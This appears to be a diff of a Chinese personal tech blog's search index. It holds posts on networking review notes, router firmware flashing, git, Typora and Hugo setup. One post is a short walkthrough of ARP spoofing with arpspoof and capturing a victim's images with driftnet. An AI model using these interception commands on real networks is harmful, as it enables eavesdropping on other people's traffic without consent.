+&lt;h4 id=&#34;计算机网络的拓扑结构有哪些&#34;&gt;计算机网络的拓扑结构有哪些？&lt;/h4&gt;
+&lt;p&gt;总线型结构、星型结构、环形结构、树型结构和网状结构。&lt;/p&gt;
+&lt;h4 id=&#34;简述osi参考模型&#34;&gt;简述OSI参考模型&lt;/h4&gt;
+&lt;ol&gt;
+&lt;li&gt;物理层：链路上比特流传输；&lt;/li&gt;
+&lt;li&gt;数据链路层：网络内部帧的传输；&lt;/li&gt;
+&lt;li&gt;网络层：网间两点间可达性；&lt;/li&gt;
+&lt;li&gt;传输层：保证端到端的传输；&lt;/li&gt;
+&lt;li&gt;会话层：会话的控制；&lt;/li&gt;
+&lt;li&gt;表示层：数据的表达及数据格式的转换&lt;/li&gt;
+&lt;li&gt;应用层：为用户具体应用服务。&lt;/li&gt;
+&lt;/ol&gt;
+">计算机导论期末复习资料</a>
+      </div>
+      
+      <div class="item">
+        <a class="result-title" href="https://tjx158589.github.io/post/cD7xvp1nC/"" data-c="
+          &lt;p&gt;、### 其实这个也是非常简单，只有三句命令就可以实现。没啥技术难度，不过只能在局域网内实现。&lt;/p&gt;
+&lt;h5 id=&#34;1-更改转发模式&#34;&gt;1、更改转发模式&lt;/h5&gt;
+&lt;pre&gt;&lt;code&gt;echo 1 &amp;gt; /proc/sys/net/ipv4/ip_forward
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1gf2q4h2n18j30vv0u07wh.jpg&#34; alt=&#34;image-20200523215235878&#34; style=&#34;zoom:67%;&#34; /&gt;
+&lt;!-- more --&gt;
+&lt;h5 id=&#34;2-arp攻击&#34;&gt;2、arp攻击&lt;/h5&gt;
+&lt;pre&gt;&lt;code&gt; arpspoof -i eth0 -t 192.168.1.1  192.168.1.100
+ 
+#arpspoof -i eth0 -t [路由器ip] [目标主机ip]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;192.168.123.1&lt;/code&gt;是我路由器地址，&lt;code&gt;192.168.123.116&lt;/code&gt;是我笔记本的地址&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;img src=&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1gf2pnalgspj30vq0u01ky.jpg&#34; alt=&#34;image-20200523213603947&#34; style=&#34;zoom:50%;&#34; /&gt;
+&lt;h5 id=&#34;3-数据还原分析&#34;&gt;3、数据还原分析&lt;/h5&gt;
+&lt;pre&gt;&lt;code&gt;# driftnet -i eth0
+//eth0是网卡
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1gf2proex9tj30u00vy7wh.jpg&#34; alt=&#34;image-20200523214018000&#34; style=&#34;zoom:50%;&#34; /&gt;
+&lt;h6 id=&#34;参数命令&#34;&gt;参数命令&lt;/h6&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;-b&lt;/code&gt; ：捕获到新的图片时发出嘟嘟声&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;-i interface&lt;/code&gt; ：选择监听接口&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;-f file&lt;/code&gt;：读取一个指定pcap数据包中的图片&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;-p&lt;/code&gt; ：不让所监听的接口使用混杂模式&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;-a&lt;/code&gt; ：后台模式：将捕获的图片保存到目录中（不会显示在屏幕上）&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;-m number&lt;/code&gt; ：指定保存图片数的数目&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;-d directory&lt;/code&gt; ：指定保存图片的路径&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;-x prefix&lt;/code&gt;：指定保存图片的前缀名&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;结果&#34;&gt;结果：&lt;/h3&gt;
+&lt;img src=&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1gf2pzieux9j31400u0qv8.jpg&#34; alt=&#34;41590241281_.pic_hd&#34; style=&#34;zoom:50%;&#34; /&gt;
+&lt;blockquote&gt;
+&lt;p&gt;左边电脑是被攻击者，右边窗口中的图片就是截取被攻击者网络数据包中抓取的图片&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;img src=&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1gf2q2mw4k2j30u00v5qv5.jpg&#34; alt=&#34;image-20200523215050019&#34; style=&#34;zoom:67%;&#34; /&gt;
+&lt;blockquote&gt;
+&lt;p&gt;截取的所有照片都会在文件夹中显示&lt;/p&gt;
+&lt;/blockquote&gt;
+">arp欺骗+Driftnet 局域网截取照片</a>
+      </div>
+      
+      <div class="item">
+        <a class="result-title" href="https://tjx158589.github.io/post/ge4jbtkcR/"" data-c="
+          &lt;h2 id=&#34;11-下载软件包&#34;&gt;1.1 下载软件包&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&#34;https://ww.lanzous.com/icnbsih&#34;&gt;点我下载  链接：https://ww.lanzous.com/icnbsih&lt;/a&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;下载后首先进行解压缩，解压缩请使用鼠标右键解压到某路径，别直接双击打开压缩包。&lt;/p&gt;
+&lt;img src=&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1geuohzxg2bj30lg0o8499.jpg&#34; alt=&#34;image-20200516225150019&#34; style=&#34;zoom: 50%;&#34; /&gt;
+&lt;/blockquote&gt;
+&lt;!-- more --&gt;
+&lt;p&gt;解压缩后得到如图所示5个文件&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1geupzmfettj30f207w0t9.jpg&#34; alt=&#34;QQ截图20200516234048&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;分别如下：&lt;br&gt;
+breed底层系统 【breed-mt7620-xiaomi-mini.bin】&lt;br&gt;
+小米mini开发板固件【miwifi_r1cm_firmware_2e9b9_2.21.109】&lt;br&gt;
+小米mini Pandorabox固件【PandoraBox-ralink-mt7620-xiaomi-mini-2017-09-27-git-f18401e-squashfs-sysupgrade.bin】PuTTY虚拟终端【putty.exe】&lt;br&gt;
+SSH客户端【WinSCP-5.13.4-Setup.exe】&lt;/p&gt;
+&lt;p&gt;其中SSH客户端直接进行安装，安装过程配置不更改，默认选项即可。&lt;/p&gt;
+&lt;h2 id=&#34;12-更新官方开发板系统&#34;&gt;1.2 更新官方开发板系统&lt;/h2&gt;
+&lt;p&gt;如下图连接路由器后进入管理地址选择系统升级，手动升级，选择压缩包内的小米mini开发板固件【miwifi_r1cm_firmware_2e9b9_2.21.109】进行升级。&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1geuoihsy1nj31dm0me46y.jpg&#34; alt=&#34;image-20200516225221699&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;13-获取ssh权限&#34;&gt;1.3 获取SSH权限&lt;/h2&gt;
+&lt;p&gt;更新后手机下载小米Wifi APP，将小米mini路由器和手机APP登陆的小米账号绑定，绑定后访问下面地址&lt;br&gt;
+https://d.miwifi.com/rom/ssh&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1geuoivwlfej31fa0sqqa9.jpg&#34; alt=&#34;image-20200516225243937&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;如图所示，此处即可看到绑定的路由器名字，root密码&lt;/p&gt;
+&lt;p&gt;接下来进行如下操作：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;请将下载的工具包bin文件复制到U盘（FAT/FAT32格式）的根目录下，保证文件名为miwifi_ssh.bin；&lt;/li&gt;
+&lt;li&gt;断开小米mini路由器的电源，将U盘插入USB接口；&lt;/li&gt;
+&lt;li&gt;按住reset按钮(路由器背后的小孔)之后重新接入电源，指示灯变为黄色闪烁状态即可松开reset键；&lt;/li&gt;
+&lt;li&gt;等待3-5秒后安装完成之后，小米路由器会自动重启，之后您就获得了路由器的SSH权限。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;14-刷入breed&#34;&gt;1.4 刷入breed&lt;/h2&gt;
+&lt;p&gt;如下图，打开之前安装的WinScp客户端，按照图中内容填写，其中密码是之前页面的root密码。&lt;/p&gt;
+&lt;img src=&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1geuoj9abr0j31f20mwnan.jpg&#34; alt=&#34;image-20200516225306227&#34; style=&#34;zoom:50%;&#34; /&gt;
+&lt;p&gt;登陆过程中可能会有警告提示，点击更新即可。&lt;/p&gt;
+&lt;img src=&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1geuojnyowuj30w00og7bo.jpg&#34; alt=&#34;image-20200516225329500&#34; style=&#34;zoom: 33%;&#34; /&gt;
+&lt;p&gt;进入后默认是/root/目录，点击下图按钮进入根目录&lt;/p&gt;
+&lt;img src=&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1geuok71231j31970u0qk5.jpg&#34; alt=&#34;image-20200516225400073&#34; style=&#34;zoom:50%;&#34; /&gt;
+&lt;p&gt;双击进入tmp目录，如下图：&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1geuokzfk73j319u0u0e30.jpg&#34; alt=&#34;image-20200516225444765&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;将之前解压的文件breed-mt7620-xiaomi-mini.bin拖入tmp文件夹中，如下图，&lt;/p&gt;
+&lt;img src=&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1geupjemp4zj31eq0lsqmo.jpg&#34; alt=&#34;image-20200516232750498&#34; style=&#34;zoom:50%;&#34; /&gt;
+&lt;p&gt;在tmp中可以看到breed文件即可，如下图，&lt;/p&gt;
+&lt;img src=&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1geupmzhh3yj31a00u0b0d.jpg&#34; alt=&#34;image-20200516233116854&#34; style=&#34;zoom:50%;&#34; /&gt;
+&lt;p&gt;此时打开压缩包中的PuTTY，如下图填写，&lt;/p&gt;
+&lt;img src=&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1geupnt8aq3j30qo0okwgz.jpg&#34; alt=&#34;image-20200516233204370&#34; style=&#34;zoom: 50%;&#34; /&gt;
+&lt;p&gt;警告点击“是”&lt;/p&gt;
+&lt;img src=&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1geupovsd7xj31f20rctk1.jpg&#34; alt=&#34;image-20200516233305727&#34; style=&#34;zoom:50%;&#34; /&gt;
+&lt;p&gt;此处用户名是root，密码是小米路由器SSH权限管理界面的root密码&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1geuppa3o0aj31f00cwad4.jpg&#34; alt=&#34;image-20200516233329020&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;到下图界面即表示通过SSH登录路由器后台&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1geuq3z6medj312g0outam.jpg&#34; alt=&#34;image-20200516234736483&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;输入命令&lt;code&gt;cd /tmp&lt;/code&gt;进入&lt;code&gt;tmp&lt;/code&gt;目录下&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;提示：cd和/tmp中间有一个空格&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;img src=&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1geuq4gz3evj30qa0go76d.jpg&#34; alt=&#34;image-20200516234805431&#34; style=&#34;zoom:50%;&#34; /&gt;
+&lt;p&gt;接下来我们开始刷&lt;code&gt;Breed&lt;/code&gt;了，输入命令：&lt;br&gt;
+&lt;code&gt;mtd -r write breed-mt7620-xiaomi-mini.bin Bootloader&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;命令开始执行后请耐心等待路由器重启，直到可以访问192.168.31.1，提前对路由器断电可能导致路由器损坏。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;img src=&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1geupr2t855j311y0omn0u.jpg&#34; alt=&#34;image-20200516233512610&#34; style=&#34;zoom:50%;&#34; /&gt;
+&lt;h2 id=&#34;15-刷入pandorabox固件&#34;&gt;1.5 刷入Pandorabox固件&lt;/h2&gt;
+&lt;p&gt;接着我们用硬物顶住mini的reset键插上电源开机，等到mini的指示灯狂闪的时候，松开reset键，打开浏览器登录192.168.1.1就可以进入Breed的web界面了，如下图&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;7&#34;&gt;&lt;img src=&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1geups02i0bj31ao0u046t.jpg&#34; alt=&#34;image-20200516233605688&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;点击&lt;code&gt;固件更新&lt;/code&gt;，在固件处选择【PandoraBox-ralink-mt7620-xiaomi-mini-2017-09-27-git-f18401e-squashfs-sysupgrade.bin】然后勾选&lt;code&gt;自动重启&lt;/code&gt;，最后点击&lt;code&gt;上传&lt;/code&gt;。&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;8&#34;&gt;&lt;img src=&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1geupsjrvjjj31cr0u0k38.jpg&#34; alt=&#34;image-20200516233637778&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;上传确认，请看图中提示。&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;9&#34;&gt;&lt;img src=&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1geupt2naehj31c50u011n.jpg&#34; alt=&#34;image-20200516233705627&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;等待进度条完成，路由器自动重启后，访问192.168.1.1即可进入Pandorabox的管理界面&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;10&#34;&gt;&lt;img src=&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1geuptb1l1vj31ce0u0ais.jpg&#34; alt=&#34;image-20200516233720094&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;16同理可以刷你所需要的任何固件&#34;&gt;1.6同理可以刷你所需要的任何固件&lt;/h2&gt;
+">小米路由器min刷breed+padavan固件</a>
+      </div>
+      
+      <div class="item">
+        <a class="result-title" href="https://tjx158589.github.io/post/dO60L6gOU/"" data-c="
+          &lt;img src=&#34;https://tva1.sinaimg.cn/large/007S8ZIlgy1ge9arpd4buj317c0u0kfe.jpg&#34; alt=&#34;gitcheatsheet&#34; style=&#34;zoom:50%;&#34; /&gt;
+&lt;!-- more --&gt;
+">一张图学会使用git</a>
+      </div>
+      
+      <div class="item">
+        <a class="result-title" href="https://tjx158589.github.io/post/DxtlyjtyA/"" data-c="
+          &lt;h2 id=&#34;1标题&#34;&gt;1.标题&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;#       一级标题    
+##      二级标题    
+###     三级标题    
+####    四级标题    
+#####   五级标题    
+######  六级标题    
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;2引用&#34;&gt;2.引用&lt;/h2&gt;
+&lt;!-- more --&gt;
+&lt;h4 id=&#34;语法&#34;&gt;语法&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; 引用内容1
+&amp;gt; 引用内容2
+&amp;gt;&amp;gt; 引用内容3
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4 id=&#34;效果&#34;&gt;效果&lt;/h4&gt;
+&lt;blockquote&gt;
+&lt;p&gt;引用内容1&lt;/p&gt;
+&lt;p&gt;引用内容2&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;引用内容3&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;3代码&#34;&gt;3.代码&lt;/h2&gt;
+&lt;h3 id=&#34;31-单行代码&#34;&gt;3.1 单行代码&lt;/h3&gt;
+&lt;h4 id=&#34;语法-2&#34;&gt;语法&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;`string str1=&amp;quot;hello&amp;quot;;`
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4 id=&#34;效果-2&#34;&gt;效果&lt;/h4&gt;
+&lt;p&gt;&lt;code&gt;string str1=&amp;quot;hello&amp;quot;;&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&#34;32-多行代码&#34;&gt;3.2 多行代码&lt;/h3&gt;
+&lt;h2 id=&#34;4列表&#34;&gt;4.列表&lt;/h2&gt;
+&lt;h3 id=&#34;41-无序列表&#34;&gt;4.1 无序列表&lt;/h3&gt;
+&lt;h4 id=&#34;语法-3&#34;&gt;语法&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;* 无序列表1
++ 无序列表2
+- 无序列表3
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;42-有序列表&#34;&gt;4.2 有序列表&lt;/h3&gt;
+&lt;h4 id=&#34;语法-4&#34;&gt;语法&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;1. 有序列表1
+2. 有序列表2
+3. 有序列表3
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;5-表格&#34;&gt;5. 表格&lt;/h2&gt;
+&lt;h4 id=&#34;语法-5&#34;&gt;语法&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;|姓名|性别|年龄|手机号|
+|:---|:--:|:--:|---:|
+|张三|男|21|18975346876|
+|李四|女|23|17789548964|
+|王五|男|25|15876513546|
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4 id=&#34;效果-3&#34;&gt;效果&lt;/h4&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style=&#34;text-align:left&#34;&gt;姓名&lt;/th&gt;
+&lt;th style=&#34;text-align:center&#34;&gt;性别&lt;/th&gt;
+&lt;th style=&#34;text-align:center&#34;&gt;年龄&lt;/th&gt;
+&lt;th style=&#34;text-align:right&#34;&gt;手机号&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;张三&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;男&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;21&lt;/td&gt;
+&lt;td style=&#34;text-align:right&#34;&gt;18975346876&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;李四&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;女&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;23&lt;/td&gt;
+&lt;td style=&#34;text-align:right&#34;&gt;17789548964&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;王五&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;男&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;25&lt;/td&gt;
+&lt;td style=&#34;text-align:right&#34;&gt;15876513546&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;6链接&#34;&gt;6.链接&lt;/h2&gt;
+&lt;h3 id=&#34;61-图片&#34;&gt;6.1 图片&lt;/h3&gt;
+&lt;h4 id=&#34;语法本地图片&#34;&gt;语法（本地图片）&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;[标题(url)]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4 id=&#34;语法网络图片&#34;&gt;语法（网络图片）&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;![bilibili](https://www.baidu.com/img/bd_logo1.png?qua=high)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4 id=&#34;效果-4&#34;&gt;&lt;em&gt;效果&lt;/em&gt;&lt;/h4&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://www.baidu.com/img/bd_logo1.png?qua=high&#34; alt=&#34;bilibili&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;h3 id=&#34;62-超链接&#34;&gt;6.2 超链接&lt;/h3&gt;
+&lt;h4 id=&#34;语法行内式链接&#34;&gt;语法（行内式链接）&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;[百度][https://www.baidu.com/]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4 id=&#34;效果-5&#34;&gt;效果&lt;/h4&gt;
+&lt;p&gt;[百度][https://www,baidu.com/]&lt;/p&gt;
+&lt;h4 id=&#34;语法参考式链接&#34;&gt;语法（参考式链接）&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;[CSDN网址]:https://www.csdn.net/
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4 id=&#34;效果-6&#34;&gt;效果&lt;/h4&gt;
+&lt;h4 id=&#34;语法自动链接&#34;&gt;语法（自动链接）&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;https://www.baidu.com/&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4 id=&#34;效果-7&#34;&gt;效果&lt;/h4&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.baidu.com/&#34;&gt;https://www.baidu.com/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;``&lt;/p&gt;
+">typora 使用方法</a>
+      </div>
+      
+      <div class="item">
+        <a class="result-title" href="https://tjx158589.github.io/post/hugogithua-bo-ke-da-jian-md/"" data-c="
+          &lt;h2 id=&#34;准备&#34;&gt;准备&lt;/h2&gt;
+&lt;h3 id=&#34;安装brew&#34;&gt;安装brew&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;打开终端，执行下面的命令。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;pre&gt;&lt;code&gt;$ /usr/bin/ruby -e &amp;quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;!-- more --&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;hugo&#34;&gt;hugo&lt;/h2&gt;
+&lt;h3 id=&#34;步骤1安装hugo&#34;&gt;步骤1:安装hugo&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;$ brew install hugo
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4 id=&#34;验证安装&#34;&gt;验证安装&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;$ hugo version
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;https://tva1.sinaimg.cn/large/007S8ZIlgy1ge8c5tw9gqj30vo0kajsf.jpg&#34; alt=&#34;image-20200427150228739&#34; style=&#34;zoom: 40%;&#34; /&gt;
+&lt;h3 id=&#34;步骤2建立新网站&#34;&gt;步骤2:建立新网站&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;新建网站文件 blog&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;pre&gt;&lt;code&gt;$ hugo new site blog
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;https://tva1.sinaimg.cn/large/007S8ZIlgy1ge8cev22wuj30vo0kaqbf.jpg&#34; alt=&#34;image-20200427151113426&#34; style=&#34;zoom:50%;&#34; /&gt;
+&lt;img src=&#34;https://tva1.sinaimg.cn/large/007S8ZIlgy1ge8cfsraevj30me046aby.jpg&#34; alt=&#34;image-20200427151209200&#34; style=&#34;zoom:50%;&#34; /&gt;
+&lt;h3 id=&#34;步骤3添加主题&#34;&gt;步骤3：添加主题&lt;a href=&#34;https://gohugo.io/getting-started/quick-start/#step-3-add-a-theme&#34;&gt; &lt;/a&gt;&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;请参阅&lt;a href=&#34;https://themes.gohugo.io/&#34;&gt;themes.gohugo.io&lt;/a&gt;以获取要考虑的主题列表。本快速入门使用了精美的&lt;a href=&#34;https://themes.gohugo.io/gohugo-theme-ananke/&#34;&gt;Ananke主题&lt;/a&gt;。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h4 id=&#34;例如m10c主题&#34;&gt;例如：m10c主题&lt;/h4&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://tva1.sinaimg.cn/large/007S8ZIlgy1ge8cinn96bj31gb0u0qh8.jpg&#34; alt=&#34;image-20200427151453707&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;blockquote&gt;
+&lt;p&gt;将此存储库克隆到&lt;code&gt;themes/&lt;/code&gt;目录中：&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;pre&gt;&lt;code&gt;$ git clone https://github.com/vaga/hugo-theme-m10c.git themes/m10c
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;https://tva1.sinaimg.cn/large/007S8ZIlgy1ge8cn17ahtj30vo0ka0z2.jpg&#34; alt=&#34;image-20200427151905845&#34; style=&#34;zoom:50%;&#34; /&gt;
+&lt;h3 id=&#34;步骤4添加一些内容&#34;&gt;步骤4：添加一些内容&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;您可以手动创建内容文件（例如作为&lt;code&gt;content//.&lt;/code&gt;）并在其中提供元数据，但是您可以使用该&lt;code&gt;new&lt;/code&gt;命令为您做一些事情（例如添加一篇 blog1.md文件）：&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;pre&gt;&lt;code&gt;hugo new posts/blog1.md
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;https://tva1.sinaimg.cn/large/007S8ZIlgy1ge8cqtu3l0j30vo0kawlt.jpg&#34; alt=&#34;image-20200427152245539&#34; style=&#34;zoom:50%;&#34; /&gt;
+&lt;blockquote&gt;
+&lt;p&gt;在目录 &lt;code&gt;blog/content/posts&lt;/code&gt;中生成 &lt;code&gt;bolg1.md&lt;/code&gt;文件&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h4 id=&#34;编辑bolg1md文件添加第一篇博客&#34;&gt;编辑&lt;code&gt;bolg1.md&lt;/code&gt;文件，添加第一篇博客&lt;/h4&gt;
+&lt;img src=&#34;https://tva1.sinaimg.cn/large/007S8ZIlgy1ge8cw3l7ofj30u00xjgse.jpg&#34; alt=&#34;image-20200427152748227&#34; style=&#34;zoom:50%;&#34; /&gt;
+&lt;h3 id=&#34;步骤5启动hugo服务器&#34;&gt;步骤5：启动Hugo服务器&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;现在，在本地以m10c主题启动Hugo服务器：&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;pre&gt;&lt;code&gt;hugo server -t m10c --buildDrafts
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;https://tva1.sinaimg.cn/large/007S8ZIlgy1ge8czgrpoqj30vo0ka7cv.jpg&#34; alt=&#34;image-20200427153103751&#34; style=&#34;zoom:50%;&#34; /&gt;
+&lt;blockquote&gt;
+&lt;p&gt;浏览器输入网址&lt;/p&gt;
+&lt;p&gt;​      显示成功&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;img src=&#34;https://tva1.sinaimg.cn/large/007S8ZIlgy1ge8d0l5anaj31gb0u0wn3.jpg&#34; alt=&#34;image-20200427153205341&#34; style=&#34;zoom:50%;&#34; /&gt;
+&lt;h3 id=&#34;步骤6将网站推上远端githua&#34;&gt;步骤6：将网站推上远端(githua)&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;根据githua库设置地址&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;hugo --theme=&amp;lt;主题》 --baseUrl=&amp;quot;&amp;lt;库地址&amp;gt;&amp;quot; --buildDrafts&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;img src=&#34;https://tva1.sinaimg.cn/large/007S8ZIlgy1ge8d7vu6vvj31gb0u07p0.jpg&#34; alt=&#34;image-20200427153908190&#34; style=&#34;zoom:50%;&#34; /&gt;
+&lt;pre&gt;&lt;code&gt;hugo --theme=m10c --baseUrl=&amp;quot;https://tjx158589.github.io/&amp;quot; --buildDrafts
+&lt;/code&gt;&lt;/pre&gt;
+&lt;blockquote&gt;
+&lt;p&gt;主目录生成需上传远端文件夹&lt;code&gt;public&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;git 上传操作&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;pre&gt;&lt;code&gt;cd public
+
+git init
+
+git add .
+
+git commit -m &amp;quot;我的 hugo 博客第一次提交&amp;quot;
+
+git remote add origin https://github.com/tjx158589/tjx158589.github.io.git
+
+
+git push -u origin master
+&lt;/code&gt;&lt;/pre&gt;
